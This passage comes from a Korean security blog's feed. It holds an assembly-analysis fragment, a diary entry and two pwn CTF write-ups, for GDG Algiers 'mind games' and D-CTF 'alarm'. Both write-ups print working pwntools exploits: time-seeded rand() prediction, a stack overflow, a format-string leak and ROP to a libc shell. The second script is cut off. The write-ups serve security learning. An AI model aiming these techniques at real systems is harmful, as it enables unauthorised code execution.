id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:0000132A xor     eax, 11h</span><br></pre></td></tr></table></figure><ul><li><code>xor</code> 연산을 진행한다. <code>eax</code>가 0x11라면 0으로 초기화가 되겠고, 0이라면 <code>eax</code>에 0x11가 저장될 것 이다.</li><li>앞 부분 분석을 해보면 <code>eax</code>에 무조건 0x11을 넣고 싶어질 것이기 때문에 이 연산 값은 0이 되고 <code>eax</code>에 0이 담긴다.</li></ul><h3 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:0000132D or      eax, edx</span><br></pre></td></tr></table></figure><ul><li><code>or</code> 연산을 진행한다. 두 값 중 어느 하나라도 0이 아니면 0이 아닌 수가 <code>eax</code>에 담길 것이다. </li><li>현재 <code>eax</code>은 0으로 고정이므로 <code>edx</code> 값에 집중하여 분석해보자.</li><li><code>edx</code>가 0이라면? <code>0 | 0 = 0</code>, <code>eax</code>의 값은 0이 된다.</li><li><code>edx</code>가 X라면? <code>0 | X = X</code>, <code>eax</code>의 값은 X이 된다.</li></ul><h3 id="4"><a href="#4" class="headerlink" title="4."></a>4.</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:0000132F test    eax, eax</span><br></pre></td></tr></table></figure><ul><li><code>eax</code>가 0인지를 검사한다. 실제로 <code>eax</code>에 값을 쓰지는 않는다.</li><li><code>eax</code>가 0인 경우: <code>edx</code>의 값이 0인 경우 </li><li><code>eax</code>가 X인 경우: <code>edx</code>의 값이 X인 경우</li></ul><h3 id="5"><a href="#5" class="headerlink" title="5."></a>5.</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:00001331 jnz     short loc_1347</span><br></pre></td></tr></table></figure><ul><li><code>jnz = jump not zero</code></li><li><code>eax</code>가 0이 아니면 jump한다.</li><li>참고로 <code>loc_1347</code>은 실행하고 싶은 로직이 아니다.</li><li>결론적으로 jump를 하면 안되고, <code>eax</code>가 0이어야 한다. <code>eax</code>가 0이려면 <code>edx</code>가 0이어야 한다.</li><li>overflow때문에 <code>edx</code>에 값을 입력할 수 있지만 배열 크기 검사를 진행했기 때문에 값을 쓰면 안된다는 결론을 얻을 수 있다.</li></ul>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rev </tag>
            
            <tag> assembly </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022-10-11 Diary</title>
      <link href="/221011-diary/"/>
      <url>/221011-diary/</url>
      
        <content type="html"><![CDATA[<h2 id="블로그-이전"><a href="#블로그-이전" class="headerlink" title="블로그 이전"></a>블로그 이전</h2><p>9월 중순? 말? 쯤에 블로그 플랫폼을 옮겼었다. 원래는 <a href="https://jiravvit.tistory.com/">티스토리 블로그</a>를 이어서 쓰려고 했었다. 하지만 개인적으로 티스토리 블로그의 코드블럭이 굉장히 마음에 안들었고 그냥 뭔가 새로운 기분을 내고 싶어서 블로그 플랫폼을 옮기고 싶다는 생각이 들었다. 그러던 중에 지금 작성 중인 github 블로그를 추천받았다. </p><p>그래서 github 블로그를 개설하고 글도 몇개 적어놨었는데, 운영체제를 바꾸다가 블로그를 날려먹었다.</p><p>나는 Hexo를 이용하고 있다. Hexo는 <code>hexo generate</code> 명령으로 public 폴더 안에 정적 파일을 생성하고, <code>hexo deploy</code>로 그 정적 파일들을 git에 올리기 위해 <code>.deploy_git</code> 폴더에 복사하고 이 곳에 있는 것만 깃허브 블로그에 올라가는 구조이다.</p><p>그래서 만약 다른 컴퓨터에서 블로그 글을 작성하고 싶다면 hexo 블로그를 생성해주는 파일 전체를 담는 폴더도 관리를 해야한다. ㅋㅋ..</p><p>아무튼 날려먹어서 절망에 빠져있었는데 다행히 글을 작성했던 md파일은 가지고 있었어서 내용 자체를 전부 날려먹지는 않았다. 사실 블로그 테마도 조금 마음에 안들었어서 바꾸고 싶은 욕심이 있었는데 잘됐지 뭐… T.T</p><p>전에 쓰던 블로그 테마는 light 모드는 예쁜데 dark 모드는 별로 예쁘지가 않았다. 어두운 곳에서 컴퓨터를 하는 비율이 많아져서 dark 모드를 조건으로 테마를 이리저리 둘러봤는데, 지금 쓰고 있는 이 테마가 dark 모드에서 가장 이쁘다고 생각했다. </p><p>나중에 sitemap도 다시 등록하고 댓글 기능도 차차 추가해야겠다.. </p><h2 id="POXX-2022-예선"><a href="#POXX-2022-예선" class="headerlink" title="POXX 2022 예선"></a>POXX 2022 예선</h2><p>얼마 전에 여성 해킹 대회 POXX 예선이 있었다. Demon팀으로서 pwn 2문제, rev 1문제를 출제했다. 문제에 대한 이야기를 풀어보고 싶은데 본선 끝나고 풀고자 한다. pwn 2문제는 각각 3, 2 solve를 달성했다. 목표했던 solve 수와 비슷해서 다행이었다.</p><h2 id="자잘한-이야기"><a href="#자잘한-이야기" class="headerlink" title="자잘한 이야기"></a>자잘한 이야기</h2><ol><li><p>요즘 도커와 친해지려고 노력 중이다. 예전에 여러번 시도했었는데 사용법이 적응이 안되어서 실패하고 가상머신을 설치했었다..ㅋㅋ 그런데 이번엔 조금 많이 친해졌다. 뿌듯하다.</p></li><li><p>전에 다니던 대학에서 보안 관련에서 발표를 해주면 좋겠다고 연락이 왔었다. 무려 총장님의 부름이었는데 개인사유로 인해 거절했다. 잘 오지 않는 기회였는데 아쉽다.</p></li><li><p>운영체제를 바꿨다. windows 11에서 arch linux로.. ㅋㅋ<br>windows가 가장 불편했던 것은 가상머신을 구동하다보면 가상머신 자체가 매우매우매우 느려진다. 그리고 뭔가 창 관리가 안됐다. 사실 wsl도 추천받고 써봤었는데 뭔가 내 스타일은 아니었다(?) 그러던 중에 arch linux로 운영체제를 바꾸는 건 어떻냐고 권유받았고 바로 실행하였다. ㅎ<br>windows에서 가상머신으로 ubuntu를 쓰는 것과 가장 큰 차이는 arch는 정말 깔려있는 게 없다는 것이다. 사용자가 전부 다 설정해줘야 한다. 자유도가 높고 가볍다는 것이 어떤건지 바로 실감할 수 있었다. 그리고 ubuntu를 설치할 땐 next 버튼 하나로 모든 것이 진행되었는데, 이건 내가 직접 명령어를 쳐줘야 한다. 좀 신기했다.<br>i3 처음 쓸 때 정말 안익숙했었는데 지금은 많이 익숙해졌다. 오히려 i3을 쓰지 않으면 불편하다. arch도 그렇게 될 것이라 믿는다.</p></li><li><p>분석하고 싶은 것이 있었어서 분석을 잠깐 했었는데 역시나 분석은 어렵다. 관련 내용을 나중에 블로그에 적고 싶다.</p></li><li><p>나중에 영어로도 글을 써보고 싶다. 언젠간 꼭..</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Diary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GDG Algiers CTF 2022 - mind games (random)</title>
      <link href="/221011-gdg_algires_ctf_2022-mind_games/"/>
      <url>/221011-gdg_algires_ctf_2022-mind_games/</url>
      
        <content type="html"><![CDATA[<p>분석 환경: Arch linux<br>사용자 제공 파일: binary, source code, libc </p><p>Help! This program is playing mind games with me! You need to put an end to this madness.</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="보호-기법"><a href="#보호-기법" class="headerlink" title="보호 기법"></a>보호 기법</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x3ff000)</span><br></pre></td></tr></table></figure><h3 id="취약점"><a href="#취약점" class="headerlink" title="취약점"></a>취약점</h3><p>제공된 source code가 짧아서 전문을 올렸다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUF_SIZE 32</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">flag</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">disable_buffering</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">flag</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    FILE* file;</span><br><span class="line">    <span class="type">int</span> c = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    file = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == file) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Cannot open flag.txt&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">            c = fgetc(file);</span><br><span class="line">            <span class="keyword">if</span> (c == EOF)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="built_in">putchar</span>(c);</span><br><span class="line">        &#125;</span><br><span class="line">        fclose(file);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> input[BUF_SIZE] = &#123; <span class="string">&#x27;\0&#x27;</span> &#125;;</span><br><span class="line">    <span class="type">int</span> randnum, guess;</span><br><span class="line"></span><br><span class="line">    disable_buffering();</span><br><span class="line"></span><br><span class="line">    srand(time(<span class="literal">NULL</span>));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You think you can read my mind? &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, input); <span class="comment">// bof</span></span><br><span class="line">    guess = atoi(input);</span><br><span class="line">    randnum = rand();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (guess == randnum) &#123;</span><br><span class="line">        flag();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;That&#x27;s what I thought.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">disable_buffering</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>random 값을 맞추면 <code>flag()</code> 함수를 호출한다. <code>scanf(&quot;%s&quot;, input)</code>에서 bof가 터지니깐 input을 입력할 때 guess랑 randnum을 동일하게 주면 우회가 되지 않을까? 생각했다. 하지만 입력 후에 guess와 randnum을 정의하기 때문에 그런 방법은 통하지 않는다.</p><p>어떻게 해야할까?</p><p>randnum을 정의하는 함수는 <code>rand()</code> 함수이다. 간단하게 말하면 이 함수는 <code>srand()</code> 함수에 의존적인데 인자로 <code>time(NULL)</code>이 들어간다. 같은 시간대에 다른 프로그램을 실행해도 프로그램의 현재 시간을 가져오기 때문에 우리는 randnum을 예측할 수 있다.</p><p>관련 내용은 나의 <a href="https://jiravvit.tistory.com/entry/NOTE-coding-%EB%82%9C%EC%88%98%EC%83%9D%EC%84%B1randsrandtime-C%EC%96%B8%EC%96%B4">구 티스토리 블로그</a>에 자세히 설명되어 있다.</p><p>이런식으로 <code>flag()</code> 함수를 호출할 수 있는데 미리 스포하자면 이 함수는 진짜 flag를 호출하지 않는다.</p><p>그래서 bof를 이용하여 rip를 바꿔 <code>execve</code>를 호춣해야 한다.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="시나리오"><a href="#시나리오" class="headerlink" title="시나리오"></a>시나리오</h3><ol><li>random 값 구한 후, libc leak 후 main으로 흐름 돌리기</li><li>random 값 다시 구한 후, one gadget 호출</li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./mind-games&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.chal.ctf.gdgalgiers.com&#x27;</span>, <span class="number">1404</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./mind-games&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./lib/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./a.out&#x27;</span>)</span><br><span class="line">random = r.recv()</span><br><span class="line">log.info(<span class="string">b&#x27;random ::&#x27;</span> + random)</span><br><span class="line">r.close()</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x00000000004014c3</span></span><br><span class="line">puts_plt = e.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = e.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload = random</span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x30</span>-<span class="built_in">len</span>(payload))</span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">8</span> <span class="comment">#rbp</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(e.got[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line">payload += p64(main)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;mind?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">leak = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line">libc_base = leak - libc.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">log.info(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./a.out&#x27;</span>)</span><br><span class="line">random = r.recv()</span><br><span class="line"></span><br><span class="line">payload = random</span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x30</span>-<span class="built_in">len</span>(payload))</span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">8</span> </span><br><span class="line">payload += p64(<span class="number">0xe6c84</span>+libc_base)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;mind?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">r.close()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="tmi"><a href="#tmi" class="headerlink" title="tmi"></a>tmi</h2><ol><li><p>풀고 나서 익스 코드를 날려버려서 대회 끝나고 다시 풀었다. 대회 때 뭔가 확률적으로 shell을 얻을 수 있었는데, 지금 생각해보니 random 값 때문이었던 것 같다. 첫 main에서 구한 random 값을 두 번째 main에서 사용하려니 시간이 조금 지나 흐름이 이어지지 않는 경우가 생겨서 while, try-except 구문을 이용했었다… ㅋㅋ </p></li><li><p>대회 종료 후 이게 솔브 수가 19였는데 25솔짜리 문제는 풀지 못하였다 ㅜㅜ, 힙 문제였는데.. 요약하자면 oob를 통해 libc leak을 할 수 있고, heap overflow를 이용하여 heap chunk의 size를 조작할 수 있다. 이거를 이용해서 푸는 문제였는데,.. 암튼 못풀었다. 다른 쉬운 힙 문제들 좀 풀어보고 풀어봐야겠다 T_T</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> random </tag>
            
            <tag> one_gadget </tag>
            
            <tag> GDG Algiers CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DefCamp Capture the Flag (D-CTF) 2022 - alarm (fsb, one_gadget)</title>
      <link href="/221005-d-ctf2022-alarm/"/>
      <url>/221005-d-ctf2022-alarm/</url>
      
        <content type="html"><![CDATA[<p>분석 환경: Windows 11, Ubuntu 20.04<br>사용자 제공 파일: 바이너리</p><p>해당 ctf에 pwn이 두 문제 나왔다. 이건 medium이다.</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="보호-기법"><a href="#보호-기법" class="headerlink" title="보호 기법"></a>보호 기법</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x3fe000)</span><br></pre></td></tr></table></figure><h3 id="취약점"><a href="#취약점" class="headerlink" title="취약점"></a>취약점</h3><p>IDA로 열어보면 되게 간단하다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+14h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> buf; <span class="comment">// [rsp+18h] [rbp-8h] BYREF</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  sub_400807(a1, a2, a3);</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Open failed&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( read(fd, &amp;buf, <span class="number">4uLL</span>) == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wellcome to the Alarm system!&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    fgets(byte_6010C0, <span class="number">1024</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="built_in">printf</span>(byte_6010C0);                        <span class="comment">// fsb</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Unlock value of alarm: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%x&quot;</span>, &amp;v4);</span><br><span class="line">    <span class="keyword">if</span> ( buf == v4 )</span><br><span class="line">      vuln(<span class="string">&quot;%x&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;UGVybWlzc2lvbiBkZW5pZWQhCg==\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Read failed\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fsb 취약점이 대놓고 보인다. 입력할 수 있는 바이트 수도 굉장히 넉넉하다.</p><p>바로 아래에서도 어떤 입력값 하나를 주고 그 입력값이 <code>/dev/urandom</code> 랜덤값과 같은지 비교한다. 같으면 <code>vuln</code> 함수가 실행되어 bof를 트리거할 수 있다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_400861</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">112</span>]; <span class="comment">// [rsp+0h] [rbp-70h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Alarm set to @%p\n&quot;</span>, buf);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">5000uLL</span>);                        <span class="comment">// bof</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fsb 취약점이 존재한다면 할 수 있는게 굉장히 많다. 예를 들면 스택 값 노출 정도?</p><p>이 문제에선 bof를 트리거하고 작성할 수 있는 바이트 수가 굉장히 넉넉하고, canary도 존재하지 않아 bof만 잘 트리거 된다면 무리없이 ROP를 진행할 수 있을 것이다.</p><p>bof를 트리거하기 위한 조건은 랜덤 값을 일치시켜야하는 것인데, 이 랜덤 값은 스택에 저장된다. 따라서 fsb로 랜덤 값을 알아낼 수 있다. </p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="시나리오"><a href="#시나리오" class="headerlink" title="시나리오"></a>시나리오</h3><ol><li>fsb를 이용하여 랜덤 값과 libc base 구하기</li><li>랜덤 값을 입력하여 bof 트리거</li><li>ROP!</li></ol><h3 id="Exploit-Code-local-Ubuntu-20-04"><a href="#Exploit-Code-local-Ubuntu-20-04" class="headerlink" title="Exploit Code (local, Ubuntu 20.04)"></a>Exploit Code (local, Ubuntu 20.04)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./alarm&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;34.159.80.143&#x27;, 31776)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./alarm&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/usr/lib/x86_64-linux-gnu/libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;system!&#x27;</span>, <span class="string">&#x27;%p %9$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line">leak = p.recvline().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(leak)</span><br><span class="line"></span><br><span class="line">libc_leak = leak[<span class="number">0</span>]</span><br><span class="line">random_leak = leak[<span class="number">1</span>][:-<span class="number">1</span>] </span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&#x27;libc_leak :: &#x27;</span> + libc_leak)</span><br><span class="line">log.info(<span class="string">&#x27;random_leak :: &#x27;</span> + random_leak)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;alarm:&#x27;</span>, random_leak)</span><br><span class="line"></span><br><span class="line">libc_base = <span class="built_in">int</span>(libc_leak,<span class="number">16</span>) - <span class="number">131</span> - libc.symbols[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&#x27;libc_base :: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line">ret = libc_base + <span class="number">0x22679</span></span><br><span 